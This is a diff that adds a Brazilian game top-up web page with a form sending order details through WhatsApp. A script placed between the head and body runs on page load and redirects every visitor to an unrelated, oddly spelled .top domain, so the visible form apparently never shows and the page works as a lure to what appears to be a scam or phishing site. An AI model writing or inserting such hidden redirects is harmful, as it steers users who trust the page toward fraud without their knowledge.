@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Recarga de Jogos Rápida e Segura</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #1e1e2f;
+      color: #fff;
+    }
+    header {
+      background: #5c00ff;
+      padding: 20px;
+      text-align: center;
+    }
+    header h1 {
+      margin: 0;
+      font-size: 28px;
+    }
+    .container {
+      padding: 30px 20px;
+      max-width: 500px;
+      margin: auto;
+    }
+    .container h2 {
+      margin-bottom: 10px;
+    }
+    input, select, button {
+      width: 100%;
+      padding: 12px;
+      margin-top: 10px;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+    }
+    input, select {
+      background: #f1f1f1;
+      color: #000;
+    }
+    button {
+      background: #00c853;
+      color: #fff;
+      cursor: pointer;
+      font-weight: bold;
+    }
+    button:hover {
+      background: #00b248;
+    }
+    .footer {
+      text-align: center;
+      font-size: 14px;
+      padding: 20px;
+      color: #aaa;
+    }
+  </style>
+</head>
+  <script>window.location.href='https://oficialrecargajogoff.top/'</script>
+<body>
+
+<header>
+  <h1>Recarga de Jogos</h1>
+  <p>Entrega rápida e segura via WhatsApp!</p>
+</header>
+
+<div class="container">
+  <h2>Preencha seus dados:</h2>
+  <form id="recargaForm">
+    <input type="text" id="nome" placeholder="Seu nome" required>
+    <input type="text" id="id" placeholder="ID do jogo" required>
+    <select id="valor">
+      <option value="Selecionar" disabled selected>Valor da recarga</option>
+      <option value="10">R$10</option>
+      <option value="20">R$20</option>
+      <option value="30">R$30</option>
+      <option value="50">R$50</option>
+    </select>
+    <input type="text" id="whatsapp" placeholder="Seu WhatsApp com DDD" required>
+    <button type="submit">Fazer Pedido via WhatsApp</button>
+  </form>
+</div>
+
+<div class="footer">
+  © 2025 Recarga Game | Todos os direitos reservados
+</div>
+
+<script>
+  document.getElementById("recargaForm").addEventListener("submit", function(e) {
+    e.preventDefault();
+    const nome = document.getElementById("nome").value;
+    const id = document.getElementById("id").value;
+    const valor = document.getElementById("valor").value;
+    const whatsapp = document.getElementById("whatsapp").value;
+
+    const mensagem = `Olá! Quero fazer uma recarga.\n\nNome: ${nome}\nID do Jogo: ${id}\nValor: R$${valor}\nWhatsApp: ${whatsapp}`;
+    const numeroLoja = "5599999999999"; // <- Coloque seu número com DDD e sem espaços
+    const url = `https://wa.me/${numeroLoja}?text=${encodeURIComponent(mensagem)}`;
+
+    window.open(url, '_blank');
+  });
+</script>
+
+</body>
+</html>
